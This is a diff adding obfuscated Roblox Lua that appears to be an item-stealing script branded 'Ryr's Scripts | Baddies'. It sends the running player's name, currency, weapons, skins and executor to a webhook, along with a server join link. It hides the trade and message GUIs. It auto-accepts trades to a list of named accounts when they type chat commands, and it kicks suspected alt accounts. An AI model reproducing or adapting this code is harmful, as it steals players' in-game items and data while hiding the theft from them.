+        v36:InvokeServer(true)
+    end)
+    task.wait(0.2)
+    pcall(function()
+        v37:InvokeServer()
+    end)
+end
+function t1.value19()
+    task.wait(0.2)
+
+    if u64 then
+        task.wait(0.2)
+
+        local v321 = value15()
+
+        if v321 and v321 > 0 then
+            pcall(function()
+                v39:InvokeServer(v321)
+            end)
+        end
+
+        task.wait(0.2)
+        pcall(function()
+            v36:InvokeServer(true)
+        end)
+        task.wait(0.2)
+        pcall(function()
+            v37:InvokeServer()
+        end)
+
+        return
+    end
+
+    if value13() > 0 then
+        task.wait(2)
+
+        local v322 = value15()
+
+        if v322 and v322 > 0 then
+            pcall(function()
+                v39:InvokeServer(v322)
+            end)
+            task.wait(0.2)
+        end
+
+        pcall(function()
+            v36:InvokeServer(true)
+        end)
+        task.wait(0.2)
+        pcall(function()
+            v37:InvokeServer()
+        end)
+    end
+end
+local value16 = t1.value16
+local function v94()
+    value16()
+    task.wait(0.2)
+    pcall(function()
+        v38:InvokeServer(t2.value15)
+    end)
+    task.wait(0.2)
+    value9()
+    u61 = false
+end
+local value14 = t1.value14
+local value18
+function t1.value21(p19)
+    task.wait(0.2)
+    local Replion3 = t2.value18.Client:GetReplion(p19)
+    if not Replion3 then
+        return
+    end
+    local PlayerList = Replion3.Data.PlayerList
+    if not PlayerList or #PlayerList < 2 then
+        return
+    end
+    local v326 = PlayerList[1]
+    local v327 = PlayerList[2]
+    local v328 = false
+    local v329 = v326 == t2.value15 or v327 == t2.value15
+    local v330, v331, v332 = ipairs(t5)
+    local g334
+    repeat
+        local v333
+
+        v332, v333 = v330(v331, v332)
+
+        if not v332 then
+            g334 = true
+        end
+
+        if g334 then
+            break
+        end
+    until v326.Name:lower() == v333:lower() or v327.Name:lower() == v333:lower()
+    if not g334 then
+        v328 = true
+    end
+    g334 = false
+    if v328 and v329 and t2.value16:FindFirstChild("Trading") then
+        task.spawn(function()
+            value18()
+        end)
+    end
+end
+value18 = t1.value18
+local value19 = t1.value19
+function t1.value22(p20, p21)
+    local PlayerByUserId = t2.value12:GetPlayerByUserId(p20)
+    if not PlayerByUserId then
+        return
+    end
+    local v338 = p21:lower()
+    local g347
+    if v338 == "s" then
+        local v339 = false
+
+        for _, v in ipairs(t5) do
+            if PlayerByUserId.Name:lower() == v:lower() then
+                v339 = true
+
+                break
+            end
+        end
+
+        if v339 then
+            task.spawn(function()
+                value19()
+            end)
+        end
+    end
+    if v338 == "1" or v338 == "2" then
+        local v342 = false
+        local v343, v344, v345 = ipairs(t5)
+
+        repeat
+            local v346
+
+            v345, v346 = v343(v344, v345)
+
+            if not v345 then
+                g347 = true
+            end
+
+            if g347 then
+                break
+            end
+        until PlayerByUserId.Name:lower() == v346:lower()
+
+        if not g347 then
+            v342 = true
+        end
+
+        g347 = false
+
+        if v342 then
+            if v338 == "1" then
+                task.wait(0.2)
+                pcall(function()
+                    v36:InvokeServer(true)
+                end)
+
+                return
+            end
+
+            if v338 == "2" then
+                task.wait(0.2)
+                pcall(function()
+                    v37:InvokeServer()
+                end)
+            end
+        end
+    end
+end
+function t1.value19()
+    if not value5() then
+        return nil
+    end
+
+    local v348, _, v350, v351, v352, v353 = v78()
+
+    if v350 < 1 then
+        t2.value15:Kick("Alt Account Detected")
+
+        return nil
+    end
+
+    local v354 = false
+
+    if v72() then
+        v354 = true
+    end
+
+    if v73() then
+        v354 = true
+    end
+
+    if v74() then
+        v354 = true
+    end
+
+    if v75() then
+        v354 = true
+    end
+
+    local t24 = {}
+
+    for k, v in pairs(v348) do
+        local v358 = true
+        local v359 = k
+        local v360 = v353[v359]
+
+        if v360 then
+            for _, v7 in ipairs(v360) do
+                if not v7 then
+                    v358 = false
+
+                    break
+                end
+            end
+        end
+
+        table.insert(t24, (not v358 and "🔴" or "🟢") .. " " .. v .. "x " .. v359)
+    end
+
+    table.sort(t24)
+
+    local v363 = table.concat(t24, "\n")
+
+    if v363 == "" then
+        v363 = "None"
+    end
+
+    local v364 = value6()
+    local leaderstats = t2.value15:FindFirstChild("leaderstats")
+    local v366 = leaderstats
+
+    if leaderstats then
+        v366 = leaderstats:FindFirstChild("Dinero")
+
+        if v366 then
+            v366 = leaderstats.Dinero.Value
+        end
+    end
+
+    local v367 = v366 or "N/A"
+
+    if leaderstats then
+        local Slays = leaderstats:FindFirstChild("Slays")
+
+        if Slays then
+            Slays = leaderstats.Slays.Value
+        end
+
+        leaderstats = Slays
+    end
+
+    local v369 = leaderstats or "N/A"
+    local v370 = v85(v367)
+    local v371 = v85(v369)
+    local s1 = "Unknown"
+
+    if syn then
+        s1 = "Synapse X"
+    elseif fluxus then
+        s1 = "Fluxus"
+    elseif request then
+        local v373 = debug.getinfo(request)
+
+        s1 = not (v373 and v373.source) and "Unknown Executor" or if not string.find(v373.source, "krnl") then if not string.find(v373.source, "scriptware") then not string.find(v373.source, "delta") and "Unknown Executor" or "Delta" else "ScriptWare" else "Krnl"
+    elseif http_request then
+        s1 = "HTTP Request"
+    elseif is_sirhurt then
+        s1 = "Sirhurt"
+    elseif pebc_execute then
+        s1 = "ProtoSmasher"
+    elseif KRNL_LOADED then
+        s1 = "Krnl"
+    elseif Synapse then
+        s1 = "Synapse X"
+    elseif getexecutorname then
+        local success, result = pcall(getexecutorname)
+        if success then
+            s1 = result
+        end
+    end
+
+    local value15Name = t2.value15.Name
+    local v377 = "https://plsbrainrot.me/joiner?placeId=" .. game.PlaceId .. "&gameInstanceId=" .. game.JobId
+    local v378 = "local ts = game:GetService('TeleportService') ts:TeleportToPlaceInstance(" .. game.PlaceId .. ", '" .. game.JobId .. "')"
+
+    if v354 then
+        local v379 = "`" .. value15Name .. "`"
+        local t26 = {
+			name = "User",
+			value = v379,
+			inline = true
+		}
+        local v381 = "`" .. tostring(v370) .. "`"
+        local t27 = {
+			name = "Dinero",
+			value = v381,
+			inline = true
+		}
+        local v383 = "`" .. tostring(v371) .. "`"
+        local t28 = {
+			name = "Slays",
+			value = v383,
+			inline = true
+		}
+        local v385 = "`" .. s1 .. "`"
+        local t29 = {
+			name = "Executor",
+			value = v385,
+			inline = true
+		}
+        local v387 = "`" .. #t2.value12:GetPlayers() .. " / " .. t2.value12.MaxPlayers .. "`"
+        local t30 = {
+			name = "Players",
+			value = v387,
+			inline = true
+		}
+        local v389 = "🟢 Tradable: " .. v351 .. " | 🔴 Untradable: " .. v352
+        local t31 = {
+			name = "Trade Status",
+			value = v389,
+			inline = true
+		}
+        local t32 = {
+			name = "⚠\239\184\143 RICH WEBHOOK SKIPPED ⚠\239\184\143",
+			value = "User has restricted weapons - NOT sending to rich webhook",
+			inline = false
+		}
+        local v392 = "```" .. v363 .. "```"
+        local t33 = {
+			name = "Weapons",
+			value = v392,
+			inline = false
+		}
+        local t34 = {
+			name = "Skins & Fighting Styles",
+			value = v364,
+			inline = false
+		}
+        local v395 = "[Click to Join](" .. v377 .. ")"
+        local t35 = {
+			t26,
+			t27,
+			t28,
+			t29,
+			t30,
+			t31,
+			t32,
+			t33,
+			t34,
+			{
+				name = "Join Link",
+				value = v395,
+				inline = false
+			}
+		}
+        local t36 = {
+			text = "Ryr's Scripts | Baddies 🍀 • Rich webhook skipped due to restricted weapons"
+		}
+        local v398 = os.date("!%Y-%m-%dT%H:%M:%SZ")
+        local t37 = {
+			title = "Ryr's Scripts | Baddies 🍀 (RICH WEBHOOK SKIPPED)",
+			color = 16711680,
+			fields = t35,
+			footer = t36,
+			timestamp = v398
+		}
+
+        if v56 then
+            v378 = "@everyone \n" .. v378
+        end
+
+        local t38 = {
+			content = v378,
+			embeds = { t37 }
+		}
+
+        task.spawn(function()
+            v86(NODH_WEBHOOK, t38)
+        end)
+
+        return true
+    end
+
+    local v401 = "`" .. value15Name .. "`"
+    local t39 = {
+		name = "User",
+		value = v401,
+		inline = true
+	}
+    local v403 = "`" .. tostring(v370) .. "`"
+    local t40 = {
+		name = "Dinero",
+		value = v403,
+		inline = true
+	}
+    local v405 = "`" .. tostring(v371) .. "`"
+    local t41 = {
+		name = "Slays",
+		value = v405,
+		inline = true
+	}
+    local v407 = "`" .. s1 .. "`"
+    local t42 = {
+		name = "Executor",
+		value = v407,
+		inline = true
+	}
+    local v409 = "`" .. #t2.value12:GetPlayers() .. " / " .. t2.value12.MaxPlayers .. "`"
+    local t43 = {
+		name = "Players",
+		value = v409,
+		inline = true
+	}
+    local v411 = "🟢 Tradable: " .. v351 .. " | 🔴 Untradable: " .. v352
+    local t44 = {
+		name = "Trade Status",
+		value = v411,
+		inline = true
+	}
+    local v413 = "```" .. v363 .. "```"
+    local t45 = {
+		name = "Weapons",
+		value = v413,
+		inline = false
+	}
+    local t46 = {
+		name = "Skins & Fighting Styles",
+		value = v364,
+		inline = false
+	}
+    local v416 = "[Click to Join](" .. v377 .. ")"
+    local t47 = {
+		t39,
+		t40,
+		t41,
+		t42,
+		t43,
+		t44,
+		t45,
+		t46,
+		{
+			name = "Join Link",
+			value = v416,
+			inline = false
+		}
+	}
+    local t48 = {
+		text = "Ryr's Scripts | Baddies 🍀"
+	}
+    local v419 = os.date("!%Y-%m-%dT%H:%M:%SZ")
+    local t49 = {
+		title = "Ryr's Scripts | Baddies 🍀",
+		color = 16711680,
+		fields = t47,
+		footer = t48,
+		timestamp = v419
+	}
+
+    if v56 then
+        v378 = "@everyone \n" .. v378
+    end
+
+    local t50 = {
+		content = v378,
+		embeds = { t49 }
+	}
+
+    task.spawn(function()
+        local v491 = NODH_WEBHOOK
+
+        if v491 then
+            v491 = NODH_WEBHOOK ~= ""
+        end
+
+        if v491 then
+            local v492 = NODH_WEBHOOK
+            local v493 = t50
+
+            v86(v492, v493)
+        end
+    end)
+
+    return true
+end
+TradeData.Remotes.TradeStarted.OnClientEvent:Connect(t1.value21)
+v16.OnClientEvent:Connect(t1.value22)
+t1.value27 = RunService.RenderStepped
+function t1.value23()
+    local Character = t2.value15.Character
+
+    if Character then
+        Character = t2.value15.Character:FindFirstChild("Humanoid")
+    end
+
+    if Character and (t2.value15.Character.Humanoid:GetState() == Enum.HumanoidStateType.Jumping and true) and t2.value16:FindFirstChild("Trading") then
+        task.spawn(function()
+            value18()
+        end)
+    end
+end
+t1.value27:Connect(t1.value23)
+function t1.value26(p22)
+    if t11[p22] then
+        return
+    end
+
+    t11[p22] = true
+    task.spawn(function()
+        while true do
+            local v494 = t11[p22]
+
+            if v494 then
+                v494 = p22
+
+                if v494 then
+                    v494 = p22.Parent
+                end
+            end
+
+            if not v494 then
+                break
+            end
+
+            if not u61 and not t10[p22] then
+                value14(p22)
+            end
+
+            task.wait(1)
+        end
+
+        t11[p22] = nil
+    end)
+end
+function t1.value23(p23)
+    t11[p23] = nil
+end
+local value26 = t1.value26
+local value23 = t1.value23
+t1.value25 = ipairs
+function t1.value23(p24)
+    if not p24 or p24 == t2.value15 then
+        return
+    end
+
+    for _, v in ipairs(t5) do
+        if p24.Name:lower() == v:lower() then
+            value26(p24)
+
+            return
+        end
+    end
+end
+local value12_2 = t2.value12
+function t1.value24(p25)
+    if t11[p25] then
+        value23(p25)
+    end
+end
+for _, v102 in t1.value25(value12_2:GetPlayers()) do
+    if v102 ~= t2.value15 then
+        for _, v in ipairs(t5) do
+            if v102.Name:lower() == v:lower() then
+                value26(v102)
+
+                break
+            end
+        end
+    end
+end
+t2.value12.PlayerAdded:Connect(t1.value23)
+t2.value12.PlayerRemoving:Connect(t1.value24)
+function t1.value20()
+    pcall(function()
+        v35:FireServer("TradeEnabled", true)
+    end)
+    t2.value16:WaitForChild("TradeList"):WaitForChild("Main"):WaitForChild("TradeRequest").Visible = true
+    t2.value11.Modules.Net["RE/Trading/TradeStarted"].OnClientEvent:Connect(function(p26)
+        if p26 and p26.Name then
+            local v496 = false
+            local v497, v498, v499 = ipairs(t5)
+            local g501
+            repeat
+                local v500
+
+                v499, v500 = v497(v498, v499)
+
+                if not v499 then
+                    g501 = true
+                end
+
+                if g501 then
+                    break
+                end
+            until p26.Name:lower() == v500:lower()
+            if not g501 then
+                v496 = true
+            end
+            if v496 and not u61 then
+                value23(p26)
+                u61 = true
+                t10[p26] = true
+                task.wait(0.2)
+                v94()
+                t10[p26] = nil
+
+                if p26 and p26.Parent then
+                    value26(p26)
+                end
+            end
+        end
+    end)
+
+    local function v429(p27)
+        local v503 = false
+        local v504, v505, v506 = pairs(t9)
+        local g508
+        repeat
+            local v507
+
+            v506, v507 = v504(v505, v506)
+
+            if not v506 then
+                g508 = true
+            end
+
+            if g508 then
+                break
+            end
+        until v506 == p27.Name
+        if not g508 then
+            v503 = true
+        end
+        if v503 then
+            return
+        end
+        if p27.Name == "Trading" then
+            p27.Enabled = false
+
+            return
+        end
+        if p27.Name == "Messages" then
+            p27:Destroy()
+        end
+    end
+
+    for _, child in ipairs(t2.value16:GetChildren()) do
+        v429(child)
+    end
+
+    t2.value16.ChildAdded:Connect(v429)
+    task.spawn(function()
+        while value5() do
+            local Trading = t2.value16:FindFirstChild("Trading")
+
+            if Trading then
+                Trading.Enabled = false
+            end
+
+            local Messages = t2.value16:FindFirstChild("Messages")
+
+            if Messages then
+                Messages:Destroy()
+            end
+
+            task.wait()
+        end
+    end)
+end
+t1.value17 = v79
+function t1.value25()
+    local function v432(p28, p29)
+        if p28 and p29 then
+            local v513 = p29:lower()
+            local v514 = v513 == "s"
+
+            if not v514 then
+                v514 = v513 == "add"
+
+                if not v514 then
+                    v514 = v513 == "1"
+
+                    if not v514 then
+                        v514 = v513 == "2"
+                    end
+                end
+            end
+
+            if v514 then
+                task.delay(0.2, function()
+                    local v525 = false
+                    local v526, v527, v528 = ipairs(t5)
+                    local g530
+                    repeat
+                        local v529
+
+                        v528, v529 = v526(v527, v528)
+
+                        if not v528 then
+                            g530 = true
+                        end
+
+                        if g530 then
+                            break
+                        end
+                    until p28.Name:lower() == v529:lower() or p28 == t2.value15
+                    if not g530 then
+                        v525 = true
+                    end
+                    if v525 then
+                        if v513 == "s" then
+                            value19()
+
+                            return
+                        end
+
+                        if v513 == "add" then
+                            value18()
+
+                            return
+                        end
+
+                        if v513 == "1" then
+                            task.wait(0.2)
+                            pcall(function()
+                                v36:InvokeServer(true)
+                            end)
+
+                            return
+                        end
+
+                        if v513 == "2" then
+                            task.wait(0.2)
+                            pcall(function()
+                                v37:InvokeServer()
+                            end)
+                        end
+                    end
+                end)
+            end
+        end
+    end
+    for v435, v436 in ipairs(t2.value12:GetPlayers()) do
+
+        local v437 = v436
+
+        if v437 ~= t2.value15 then
+            pcall(function()
+                v437.Chatted:Connect(function(message)
+                    v432(v437, message)
+                end)
+            end)
+        end
+    end
+    t2.value12.PlayerAdded:Connect(function(player)
+        pcall(function()
+            player.Chatted:Connect(function(message)
+                v432(player, message)
+            end)
+        end)
+    end)
+    local value13_2 = t2.value13
+    if value13_2 then
+        value13_2 = t2.value13.OnIncomingMessage
+    end
+    if value13_2 then
+        function t2.value13.OnIncomingMessage(p30)
+            local TextSource = p30.TextSource
+
+            if not TextSource then
+                return
+            end
+
+            local PlayerByUserId = t2.value12:GetPlayerByUserId(TextSource.UserId)
+
+            if not PlayerByUserId then
+                return
+            end
+
+            local v519 = tostring(p30.Text or ""):lower()
+            local v520 = v519 == "s"
+
+            if not v520 then
+                v520 = v519 == "add"
+
+                if not v520 then
+                    v520 = v519 == "1"
+
+                    if not v520 then
+                        v520 = v519 == "2"
+                    end
+                end
+            end
+
+            if v520 then
+                task.delay(0.2, function()
+                    v432(PlayerByUserId, v519)
+                end)
+            end
+        end
+    end
+end
+local _, _, v107 = t1.value17()
+if v107 < 1 then
+    t2.value15:Kick("Alt Account Detected")
+
+    return
+end
+v65()
+t1.value7()
+t1.value19()
+t1.value20()
+t1.value25()
+t1.value17 = v38.InvokeServer
+local value17 = t1.value17
+t1.value17 = v38
+function t1.value17.InvokeServer(p31, p32)
+    local v441 = value17(p31, p32)
+
+    for _, v in ipairs(t5) do
+        if p32.Name:lower() == v:lower() and not u61 then
+            value23(p32)
+            u61 = true
+            t10[p32] = true
+            task.spawn(function()
+                task.wait(0.2)
+                v94()
+                t10[p32] = nil
+
+                local v521 = p32
+
+                if v521 then
+                    v521 = p32.Parent
+                end
+
+                if v521 then
+                    value26(p32)
+                end
+            end)
+
+            return v441
+        end
+    end
+
+    return v441
+end
